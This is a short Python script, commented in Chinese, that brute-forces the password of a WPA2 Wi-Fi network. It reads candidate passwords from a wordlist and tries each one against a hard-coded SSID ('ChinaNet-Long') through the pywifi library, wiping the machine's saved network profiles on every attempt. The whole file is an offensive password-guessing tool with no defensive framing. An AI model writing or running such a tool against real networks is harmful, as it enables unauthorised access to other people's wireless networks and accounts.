import mmap,chardet
import pywifi
from pywifi import const
import time

class FuckWifi:
    def __init__(self):
        self.process_text_with_mmap('./src/fuck_wifi/wordlist/passlist.txt',self.connect_to_wifi)
    def connect_to_wifi(self, ssid, password):
        # 初始化 WiFi
        wifi = pywifi.PyWiFi()
        
        # 获取第一个无线网卡接口
        iface = wifi.interfaces()[0]
        
        # 断开当前连接
        iface.disconnect()
        time.sleep(1)  # 等待断开完成
        
        # 创建配置文件
        profile = pywifi.Profile()
        profile.ssid = ssid  # WiFi名称
        profile.auth = const.AUTH_ALG_OPEN  # 认证算法
        profile.akm.append(const.AKM_TYPE_WPA2PSK)  # 加密类型(WPA2)
        profile.cipher = const.CIPHER_TYPE_CCMP  # 加密单元
        profile.key = password  # WiFi密码
        
        # 移除所有已有配置文件并添加新配置
        iface.remove_all_network_profiles()
        temp_profile = iface.add_network_profile(profile)
        
        # 尝试连接
        iface.connect(temp_profile)
        #time.sleep(1)  # 等待连接完成
        
        # 检查连接状态
        if iface.status() == const.IFACE_CONNECTED:
            print(f"成功连接到 {ssid}!")
            return True
        else:
            print(f"连接 {ssid} 失败!")
            return False
    def process_text_with_mmap(self, file_path, callback):
        # 先检测文件编码
        with open(file_path, 'rb') as f:
            raw_data = f.read(10000)  # 读取部分内容来检测编码
            encoding = chardet.detect(raw_data)['encoding']
        
        with open(file_path, 'rb') as f:
            with mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_READ) as mm:
                for line in iter(mm.readline, b''):
                    try:
                        decoded_line = line.decode(encoding).strip()
                    except UnicodeDecodeError:
                        # 如果自动检测失败，尝试fallback编码
                        decoded_line = line.decode("gbk", errors="ignore").strip()
                    
                    if decoded_line:
                        callback('ChinaNet-Long',decoded_line)

if __name__ == "__main__":
    FuckWifi()